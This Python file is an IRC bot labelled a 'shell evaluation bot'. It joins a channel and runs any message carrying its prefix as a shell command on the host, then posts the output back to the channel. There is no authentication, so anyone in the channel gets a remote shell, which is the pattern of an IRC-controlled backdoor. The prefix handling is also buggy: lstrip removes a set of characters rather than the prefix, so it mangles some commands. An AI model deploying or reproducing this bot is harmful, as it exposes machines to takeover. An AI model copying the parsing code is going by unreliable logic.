import asyncio
import sys
import bottom

host = sys.argv[1]
port = int(sys.argv[2])
our_nick = sys.argv[3]
channel = sys.argv[4]

bot = bottom.Client(
    host=host,
    port=port,
    ssl=True,
)


@bot.on("CLIENT_CONNECT")
async def on_connect(**kwargs):
    print(f"Connected to {host}:{port}!")
    bot.send("NICK", nick=our_nick)
    bot.send("USER", user=our_nick, realname="shell evaluation bot")

    # Don't try to join channels until the server has
    # sent the MOTD, or signaled that there's no MOTD.
    done, pending = await asyncio.wait(
        [bot.wait("RPL_ENDOFMOTD"),
         bot.wait("ERR_NOMOTD")],
        return_when=asyncio.FIRST_COMPLETED
    )

    # Cancel whichever waiter's event didn't come in.
    for future in pending:
        future.cancel()

    print(f"Joining channel {channel}")
    bot.send("JOIN", channel=channel)


@bot.on("PING")
def keepalive(message, **kwargs):
    bot.send("PONG", message=message)


@bot.on("PRIVMSG")
def message(nick, target, message, **kwargs):
    # Ignore ourselves.
    if nick == our_nick:
        return

    # Check for prefix.
    if message.startswith("globaleval:") or message.startswith(our_nick + ":"):
        command = message.lstrip("globaleval:").lstrip(our_nick + ":").strip()
        asyncio.create_task(run_command(command))


async def watch(stream):
    async for line in stream:
        bot.send("PRIVMSG", target=channel, message=line.decode())


async def run_command(command: str):
    print("running command: " + command, flush=True)
    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    await asyncio.gather(
        watch(process.stdout),
        watch(process.stderr)
    )


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(bot.connect())
    loop.run_forever()

